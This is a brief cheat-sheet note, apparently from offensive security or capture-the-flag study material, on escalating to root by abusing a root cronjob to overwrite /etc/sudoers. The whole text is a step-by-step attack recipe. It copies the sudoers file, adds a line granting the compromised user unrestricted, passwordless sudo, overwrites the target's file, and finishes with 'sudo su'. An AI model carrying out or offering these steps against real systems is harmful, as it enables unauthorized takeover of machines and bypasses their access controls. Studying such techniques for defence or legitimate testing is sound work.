### Use cases:

### If a cronjob running as root exists that can overwrite a file within the file system, one file we can abuse is the sudoers file.

#### STEPS:

#### 1) Attacking machine: sudo cp /etc/sudoers .

#### 2) Attacking machine: Give the current user you already owned sudo privileges for all commands like:

#### USER  ALL=(ALL:ALL) ALL

#### or

#### USER ALL=(ALL:ALL) NOPASSWD:ALL

#### 3) According to the cronjob at the time, use it to transfer the sudoers file from the attacking machine to the target machine, overwriting the target's /etc/sudoers file with your own modified file.

#### 4) sudo su

#### 5) PROFIT!
